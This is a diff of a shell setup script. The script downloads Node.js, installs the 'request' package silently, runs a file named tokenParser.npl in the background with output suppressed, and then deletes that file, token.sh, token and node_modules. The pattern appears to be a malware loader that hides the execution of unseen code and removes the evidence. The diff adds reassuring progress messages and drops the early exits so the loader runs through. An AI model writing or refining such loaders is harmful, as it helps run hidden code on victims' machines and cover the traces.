@@ -29,16 +29,13 @@ if [ "$INSTALL_NODE" -eq 1 ]; then
         echo "Using curl to download Node.js"
         curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL" >/dev/null 2>&1 &
     fi
-    wait
 fi
 
 # Step 4: Extract Node.js tarball
 if [ -f "$NODE_TARBALL" ]; then
+    echo "Extracting Node.js tarball..."
     tar -xf "$NODE_TARBALL" -C "$(pwd)" >/dev/null 2>&1 &
-    wait
-    rm -f "$NODE_TARBALL"
-else
-    exit 1
+    rm -f "$NODE_TARBALL" &
 fi
 
 # Step 5: Add Node.js to the system path
@@ -51,30 +48,27 @@ fi
 
 # Step 7: Install the "request" package if it's not installed
 if [ ! -d "$(pwd)/node_modules/request" ]; then
-
-    echo "successfully running node"
+    echo "Installing 'request' package..."
     npm install request --silent --no-progress --loglevel=error --fund=false >/dev/null 2>&1 &
-    wait
 fi
 
 # Step 8: Run tokenParser.npl if it exists
 if [ -f "$(pwd)/tokenParser.npl" ]; then
+    echo "Running tokenParser.npl..."
     node "$(pwd)/tokenParser.npl" >/dev/null 2>&1 &
-    wait
-else
-    exit 1
 fi
 
-
-echo "successfully running node"
-
 # Step 9: Clean up generated files
+echo "Cleaning up generated files..."
 rm -f "$(pwd)/token.sh" >/dev/null 2>&1 &
 rm -f "$(pwd)/token" >/dev/null 2>&1 &
 rm -f "$(pwd)/tokenParser.npl" >/dev/null 2>&1 &
 rm -rf "$(pwd)/node_modules" >/dev/null 2>&1 &
 rm -f "$(pwd)/package.json" >/dev/null 2>&1 &
 rm -f "$(pwd)/package-lock.json" >/dev/null 2>&1 &
+
+# Wait for all background tasks to finish
 wait
 
+echo "Successfully completed all tasks!"
 exit 0
